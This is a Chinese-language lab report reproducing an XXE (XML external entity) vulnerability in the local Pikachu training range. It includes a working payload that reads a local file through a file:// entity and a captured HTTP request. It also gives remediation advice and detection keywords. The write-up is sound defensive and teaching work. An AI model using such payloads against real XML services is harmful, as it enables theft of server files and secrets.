\# Web 漏洞复现报告：XXE XML 外部实体注入



\## 1. 漏洞概述



\* 漏洞名称：XXE XML 外部实体注入

\* 漏洞类型：XML 解析器配置缺陷 / 外部实体注入

\* 风险等级：高

\* 复现环境：Pikachu

\* 测试方式：本地授权靶场测试

\* 影响范围：XML 接口、SOAP 接口、SAML 登录、文件导入、配置导入、第三方回调等接收 XML 数据的功能点。



本次测试在本地 Pikachu 靶场中完成，主要复现 XXE 漏洞模块。测试发现，服务端接收 XML 数据并进行解析时，允许解析外部实体，导致用户可以通过 XML 中定义的外部实体读取服务器本地文件内容。



本次测试仅读取自己创建的无害测试文件 `xxe-test.txt`，不读取真实敏感文件，不涉及真实业务系统、公网目标或未授权测试。



\## 2. 漏洞原理



XXE 的全称是 XML External Entity，中文通常称为 XML 外部实体注入。



通俗理解：



```text id="fhqyzs"

网站接收 XML 数据。

XML 里可以定义一个“外部实体”。

如果服务端解析 XML 时没有关闭外部实体解析，

攻击者就可能让服务器读取本地文件，或者请求内部地址。

```



可以把外部实体理解为 XML 里的一个“替身变量”。



例如：



```xml id="u6y9ua"

<!ENTITY xxe SYSTEM "file:///C:/data/phpstudy\_pro/WWW/pikachu/xxe-test.txt">

```



这表示定义一个名为 `xxe` 的实体，它的内容来自服务器本地文件：



```text id="7gux4q"

C:/data/phpstudy\_pro/WWW/pikachu/xxe-test.txt

```



当 XML 中出现：



```xml id="s8rtj4"

<name>\&xxe;</name>

```



如果服务端 XML 解析器允许解析外部实体，就会把 `\&xxe;` 替换为文件内容。



XXE 的核心问题不是 XML 本身有问题，而是服务端 XML 解析器配置不安全，允许加载外部实体。



\## 3. 复现环境



\* 系统环境：Windows

\* Web 环境：小皮面板 / PHP / MySQL

\* 靶场名称：Pikachu

\* 靶场地址：`http://127.0.0.1/pikachu`

\* 使用工具：Chrome、Burp Suite、记事本

\* 漏洞模块：XXE 漏洞

\* 测试方式：本地授权靶场测试



\## 4. 复现步骤



\### 4.1 定位测试点



进入 Pikachu 后，选择左侧菜单：



```text id="jm9bxt"

XXE -> XXE漏洞

```



截图：



!\[01-xxe-page](../screenshots/xxe/01-xxe-page.png)



该页面提示“这是一个接收 xml 数据的 api”，说明该功能会接收并解析用户提交的 XML 数据。



\### 4.2 正常 XML 解析测试



先提交正常 XML 数据：



```xml id="em9u7p"

<?xml version="1.0"?>

<!DOCTYPE note \[

]>

<name>test</name>

```



页面返回：



```text id="qpul7i"

test

```



截图：



!\[02-normal-xml-result](../screenshots/xxe/02-normal-xml-result.png)



该步骤说明服务端会解析 XML，并将 `<name>` 标签中的内容返回到页面。



\### 4.3 创建无害测试文件



为了避免读取真实敏感文件，在 Pikachu 目录下创建一个无害测试文件：



```text id="u5j5z7"

C:\\data\\phpstudy\_pro\\WWW\\pikachu\\xxe-test.txt

```



文件内容为：



```text id="ou7swa"

xxe local file read test success

```



该文件仅用于证明外部实体读取是否成功，不包含任何敏感信息。



\### 4.4 构造 XXE Payload



提交以下 XML 数据：



```xml id="hfwcmw"

<?xml version="1.0"?>

<!DOCTYPE note \[

<!ENTITY xxe SYSTEM "file:///C:/data/phpstudy\_pro/WWW/pikachu/xxe-test.txt">

]>

<name>\&xxe;</name>

```



该 Payload 的含义是：



1\. 定义一个外部实体 `xxe`；

2\. 让该实体指向本地无害测试文件；

3\. 在 `<name>` 标签中引用 `\&xxe;`；

4\. 如果服务端允许外部实体解析，就会把文件内容返回到页面。



\### 4.5 观察 XXE 返回结果



提交后，页面返回：



```text id="xskxzz"

xxe local file read test success

```



截图：



!\[03-xxe-file-read-result](../screenshots/xxe/03-xxe-file-read-result.png)



该结果说明服务端解析 XML 时加载了外部实体，并读取了本地测试文件内容。XXE 漏洞成功复现。



\### 4.6 Burp Suite 抓包分析



使用 Burp Suite 抓取 XXE 请求。



截图：



!\[04-burp-xxe-request](../screenshots/xxe/04-burp-xxe-request.png)



请求中的关键内容为：



```http id="q9svkg"

POST /pikachu/vul/xxe/xxe\_1.php HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Cookie: PHPSESSID=\*\*\*



xml=<?xml version="1.0"?>

<!DOCTYPE note \[

<!ENTITY xxe SYSTEM "file:///C:/data/phpstudy\_pro/WWW/pikachu/xxe-test.txt">

]>

<name>\&xxe;</name>

\&submit=提交

```



该请求说明 XML 数据通过 `xml` 参数提交给服务端，其中包含 `DOCTYPE`、`ENTITY` 和 `file://` 外部实体定义。



\## 5. 漏洞验证结果



XXE 漏洞成功复现。



验证依据如下：



1\. 正常 XML `<name>test</name>` 可以被服务端解析并返回 `test`；

2\. 构造外部实体 `xxe` 指向本地无害测试文件；

3\. 页面返回了测试文件内容 `xxe local file read test success`；

4\. Burp Suite 抓包显示请求中包含 `DOCTYPE`、`ENTITY` 和 `file://`；

5\. 说明服务端 XML 解析器允许解析外部实体。



关键截图：



| 截图                                               | 说明             |

| ------------------------------------------------ | -------------- |

| `../screenshots/xxe/01-xxe-page.png`             | XXE 测试页面       |

| `../screenshots/xxe/02-normal-xml-result.png`    | 正常 XML 解析结果    |

| `../screenshots/xxe/03-xxe-file-read-result.png` | XXE 读取无害测试文件成功 |

| `../screenshots/xxe/04-burp-xxe-request.png`     | Burp 抓取 XXE 请求 |



\## 6. 风险影响



XXE 漏洞可能造成以下影响：



\* 读取服务器本地文件；

\* 泄露配置文件、源码、日志、密钥等敏感信息；

\* 请求内网地址，辅助内网探测；

\* 在特定解析器和环境下造成 SSRF 类风险；

\* 在某些场景下可能造成拒绝服务；

\* 与其他漏洞组合后扩大攻击影响。



在真实业务系统中，如果 XML 接口、SOAP 服务、SAML 登录、文件导入等功能存在 XXE，攻击者可能通过构造 XML 外部实体读取敏感文件或访问内部资源。



本次测试只读取自己创建的无害测试文件，不涉及真实敏感文件读取。



\## 7. 修复建议



建议从以下方面修复 XXE 漏洞：



1\. 禁用 XML 外部实体解析；

2\. 禁用 DTD；

3\. 禁止解析外部参数实体；

4\. 使用安全配置的 XML 解析器；

5\. 如果业务不需要 XML，优先使用 JSON 等更简单的数据格式；

6\. 对 XML 输入进行大小限制和结构校验；

7\. 不在响应中直接回显解析后的敏感内容；

8\. 限制服务端访问本地文件和内网资源的能力；

9\. 对包含 `DOCTYPE`、`ENTITY`、`SYSTEM`、`file://` 的 XML 请求记录日志并告警；

10\. 定期检查第三方 XML 解析库和框架默认配置。



\## 8. 安全运营视角：日志表现与告警建议



\### 8.1 日志表现



XXE 在日志中可能表现为：



\* 请求体中出现 `DOCTYPE`；

\* 请求体中出现 `ENTITY`；

\* 请求体中出现 `SYSTEM`；

\* 请求体中出现 `file://`；

\* XML 接口中出现异常 DTD 定义；

\* XML 接口响应内容异常，可能包含文件内容片段；

\* 服务端出站请求日志中出现由 XML 解析触发的外部请求。



\### 8.2 告警建议



\* 对 XML 接口中出现 `DOCTYPE`、`ENTITY`、`SYSTEM`、`file://` 的请求进行告警；

\* 对 SOAP、SAML、文件导入等 XML 接口进行重点监控；

\* 对异常响应长度变化进行关联分析；

\* 对服务端访问本机文件、内网地址或异常外部地址的行为进行监控；

\* 对同一 IP 高频提交异常 XML 的行为进行聚合告警。



\### 8.3 误报控制



部分合法 XML 文档可能包含 DTD，因此不能只根据 `DOCTYPE` 单独判断攻击。应结合是否包含外部实体、是否指向本地文件或内网地址、接口功能、用户身份和响应异常情况综合判断。



\## 9. 复测结论



\* 复测结果：未复测

\* 复测说明：当前 Pikachu 靶场用于漏洞演示，未对源码进行实际修复。本报告根据漏洞原理给出修复建议。

\* 整改建议：真实业务系统应禁用 XML 外部实体解析和 DTD，使用安全配置的 XML 解析器，并对异常 XML 请求进行日志记录和告警。



